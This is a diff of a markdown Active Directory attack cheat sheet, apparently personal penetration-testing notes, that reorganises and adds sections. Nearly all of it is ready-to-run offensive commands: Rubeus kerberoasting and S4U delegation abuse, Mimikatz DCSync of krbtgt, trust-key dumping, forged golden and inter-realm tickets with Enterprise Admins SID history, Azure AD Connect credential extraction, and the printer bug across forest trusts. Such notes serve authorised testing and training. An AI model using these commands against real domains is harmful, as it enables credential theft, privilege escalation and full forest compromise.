@@ -9,13 +9,15 @@
     * [Printer Bug](#Printer-bug) 
   * [Constrained Delegation](#Constrained-delegation) 
 * [DNS Admins](#DNS-Admins) 
-* [Child to parent attacks](#Child-to-parent-attacks) 
-  * [Trust tickets](#Trust-tickets)
-  * [Krbtgt hash](#Krbtgt-hash)
 * [Cross Domain attacks](#Cross-Domain-attacks)
   * [MS Exchange](#MS-Exchange2)
+  * [Azure AD](#Azure-AD)
+  * [Child to Forest Root](#Child-to-Forest-Root)
+    * [Trust key](#Trust-key)
+    * [Krbtgt hash](#Krbtgt-hash)
 * [Cross Forest attacks](#Cross-Forest-attacks)
   * [Kerberoast](#Kerberoast2)
+  * [Printer Bug](#Printer-bug2) 
   * [Trust flow](#Trust-flow) 
 * [Trust abuse SQL](#Trust-abuse-SQL) 
 
@@ -37,17 +39,17 @@ Rubeus.exe kerberoast /stats
 
 #### Reguest a TGS
 ```
+Rubeus.exe kerberoast /user:<SERVICEACCOUNT> /simple /domain <DOMAIN> /outfile:kerberoast_hashes.txt
+Rubeus.exe kerberoast /rc4opsec /outfile:kerberoast_hashes.txt
+```
+
+```
 Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
 ```
 
 ```
-Request-SPNTicket "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
-```
-
-```
-Rubeus.exe kerberoast /user:<SERVICEACCOUNT> /simple
-Rubeus.exe kerberoast /rc4opsec /outfile:kerberoast_hashes.txt
+Request-SPNTicket "<SPN>"
 ```
 
 #### Request TGS Avoid detection
@@ -212,8 +214,8 @@ Invoke-Mimikatz -Command '"kerberos::ptt <KIRBI FILE>"'
 ```
 
 ```
-Copy the base64 encoded TGT, remove extra spaces and use it on the attacker' machine:
-.\Rubeus.exe ptt /tikcet:
+# Copy the base64 encoded TGT, remove extra spaces and use it on the attacker' machine:
+.\Rubeus.exe ptt /ticket:<TICKET FILE>
 ```
 
 #### Run DCSync to get credentials:
@@ -227,36 +229,36 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
 - https://github.com/leechristensen/SpoolSample
 
 ```
-.\MS-RPRN.exe \\<DC NAME> \\<TARGET SERVER>
+.\MS-RPRN.exe \\<DC NAME> \\<TARGET SERVER WITH DELEGATION>
 ```
 
 ### Constrained Delegation
 - To execute attack owning the user or server with constrained delegation is required.
 #### Enumerate users with contrained delegation enabled
-- Use the -domain flag to check for other domain
+- Use the ```-domain``` flag to check for other domains
 ```
 Get-DomainUser -TrustedToAuth
 Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
 ```
 
 #### Enumerate computers with contrained delegation enabled
-- Use the -domain flag to check for other domain
+- Use the ```-domain``` flag to check for other domains
 ```
 Get-Domaincomputer -TrustedToAuth
 Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
 ```
 
 ### Constrained delegation User
+#### Rubeus calculate password hash
+- If only password is available calculate the hash
+```
+.\Rubeus.exe hash /password:<PASSWORD> /user:<USER> /domain:<DOMAIN>
+```
+
 #### Rubeus request and inject TGT + TGS
+- Possbible services: CIF for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM and LDAP for dcsync
 ```
-Rubeus.exe s4u /user:<USERNAME> /rc4:<NTLM HASH> /impersonateuser:administrator /domain:<DOMAIN> /msdsspn:CIFS/<SERVER FQDN> /altservice:<SECOND SERVICE> /<SERVER FQDN> /ptt
-
-Rubeus.exe s4u /user:<USERNAME> /rc4:<NTLM HASH> /impersonateuser:administrator /domain:<DOMAIN> /msdsspn:CIFS/<SERVER FQDN> /altservice:ldap /<SERVER FQDN> /ptt
-```
-
-#### Run DCSync to get credentials:
-```
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
+.\Rubeus.exe s4u /user:<USERNAME> /rc4:<NTLM HASH> /impersonateuser:administrator /domain:<DOMAIN> /msdsspn:CIFS/<SERVER FQDN> /altservice:<SECOND SERVICE> /<SERVER FQDN> /ptt
 ```
 
 #### Requesting TGT with kekeo
@@ -266,7 +268,6 @@ Tgt::ask /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM HASH>
 ```
 
 #### Requesting TGS with kekeo
-
 ```
 Tgs::s4u /tgt:<TGT> /user:Administrator@<DOMAIN> /service:CIFS/<FQDN SERVER>|<SECOND SERVICE>/<SERVER FQDN>
 ```
@@ -276,7 +277,10 @@ Tgs::s4u /tgt:<TGT> /user:Administrator@<DOMAIN> /service:CIFS/<FQDN SERVER>|<SE
 Invoke-Mimikatz -Command '"kerberos::ptt <KIRBI FILE>"'
 ```
 
-#### Now you can execute commands on the server
+#### Run DCSync to get credentials:
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
+```
 
 ### Constrained delegation Computer
 #### Requesting TGT with a PC hash
@@ -315,62 +319,6 @@ Dnscmd <dns server> /config /serverlevelplugindll \\<ip>\dll\mimilib.dll
 Sc \\<dns server> stop dns
 Sc \\<dns server> start dns
 ```
-
-## Child to parent attacks
-### Trust tickets
-- Abuses SID History
-#### Dump trust keys
-- Look for in trust key from child to parent (first command)
-```
-Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <COMPUTERNAME>
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:<CHILD DOMAIN>\<PARENT DOMAIN>$"'
-Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
-```
-
-#### Create an inter-realm TGT
-- Uses well know Enterprise Admins SIDS
-```
-Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<SID CHILD DOMAIN> /sids:S-1-5-21-2781415573-
-3701854478-2406986946-519 /rc4:<TRUST KEY HASH> /service:krbtgt /target:<FQDN PAARENT DOMAIN> /ticket:<PATH TO SAVE TICKET>"'
-```
-
-#### Create a TGS for a service (kekeo_old and new)
-```
-tgs::ask /tgt:<KIRBI FILE> /service:CIFS/<FQDN PARENT DC>
-./asktgs.exe <KIRBI FILE> CIFS/<FQDN PARENT DC>
-```
-
-#### Use TGS to access the targeted service (may need to run it twice) (kekeo_old and new)
-```
-./kirbikator.exe lsa .\<KIRBI FILE>
-misc::convert lsa <KIRBI FILE>
-```
-
-#### Check access to server
-```
-dir \\<FQDN PARENT DC>\C$ 
-```
-
-### Krbtgt hash
-- Abuses SID History
-#### Get krbtgt hash from dc
-```
-Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
-```
-
-#### Create TGT and inject in current session
-- The mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for dollarcorp.moneycorp.local that is the Forest Enterprise Admin Group
-```
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<CHILD DOMAIN SID> /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /krbtgt:<HASH> /ptt"'
-```
-
-#### Check access to server
-```
-dir \\<FQDN PARENT DC>\C$ 
-```
-
-#### Enter pssession to server!
-
 ## Cross Domain attacks
 ### MS Exchange2
 ![afbeelding](https://user-images.githubusercontent.com/43987245/119706037-bf8d3000-be59-11eb-84cc-6568ba6e5d26.png)
@@ -411,6 +359,89 @@ $group = Get-DomainGroup -Identity 'DNSAdmins' -Domain <DOMAIN>
 Add-DomainGroupMember -Identity $group -Members $user -Verbose
 ```
 
+## Azure AD
+#### Enumerate where PHS AD connect is installed
+```
+Get-DomainUser -Identity "MSOL_*" -Domain <DOMAIN>
+```
+
+#### On the AD connect server extract MSOL_ Credentials
+```
+.\adconnect.ps1
+```
+
+#### Run cmd as MSOL_
+```
+runas /user:<DOMAIN>\<USER> /netonly cmd
+```
+
+#### Execute DCSync
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
+```
+
+## Child to Forest Root
+### Trust key
+- Abuses SID History
+#### Dump trust keys
+- Look for in trust key from child to parent (first command)
+- The mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for the Forest Enterprise Admin Group
+```
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <COMPUTERNAME>
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<CHILD DOMAIN>\<PARENT DOMAIN>$"'
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+```
+
+#### Create an inter-realm TGT
+- Uses well know Enterprise Admins SIDS
+```
+Invoke-Mimikatz -Command '"Kerberos::golden /domain:<FQDN CHILD DOMAIN> /user:Administrator /rc4:<TRUST KEY HASH> /sid:<SID CHILD DOMAIN> /sids:S-1-5-21-2781415573-
+3701854478-2406986946-519 /service:krbtgt /target:<FQDN PAARENT DOMAIN> /ticket:<PATH TO SAVE TICKET>"'
+```
+
+#### Create a TGS using Rubeus and inject current Powershell session
+- Possbible services: CIF for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM and LDAP for dcsync
+```
+.\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:<SERVICE>/<FQDN PARENT DC> /dc:<FQDN PARENT DC> /ptt
+```
+
+#### Create a TGS for a service (kekeo_old and new)
+- Possbible services: CIF for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM and LDAP for dcsync
+```
+./asktgs.exe <KIRBI FILE> <SERVICE>/<FQDN PARENT DC>
+tgs::ask /tgt:<KIRBI FILE> /service:<SERVICE>/<FQDN PARENT DC>
+```
+
+#### Use TGS to access the targeted service (may need to run it twice) (kekeo_old and new)
+```
+./kirbikator.exe lsa .\<KIRBI FILE>
+misc::convert lsa <KIRBI FILE>
+```
+
+#### Use service, for example CIFS:
+```
+dir \\<FQDN PARENT DC>\C$ 
+```
+
+### Krbtgt hash
+- Abuses SID History
+#### Get krbtgt hash from dc
+```
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
+```
+
+#### Create TGT and inject in current session
+- The mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for the Forest Enterprise Admin Group
+```
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<CHILD DOMAIN SID> /krbtgt:<HASH> /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt"'
+```
+
+#### Check access to server
+```
+dir \\<FQDN PARENT DC>\C$ 
+Enter-PSSession <COMPUTERNAME>
+```
+
 ## Crossforest attacks
 ### Kerberoast2
 #### Enumerate users with SPN cross-forest
@@ -420,6 +451,16 @@ Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | %{Get-DomainUser -SP
 
 #### Request and crack TGS see:
 See [Kerberoast](#Kerberoast) 
+
+### Printer bug2
+-  It also works across a Two-way forest trust with TGT Delegation enabled!
+
+#### Check if TGTDelegation is enabled (run on DC)
+```
+netdom trust <CURRENT FOREST> /domain:<TRUSTED FOREST> /EnableTgtDelegation
+```
+
+See [Printer Bug](#Printer-bug) for exploitation
 
 ### Trust flow
 #### Dump trust keys
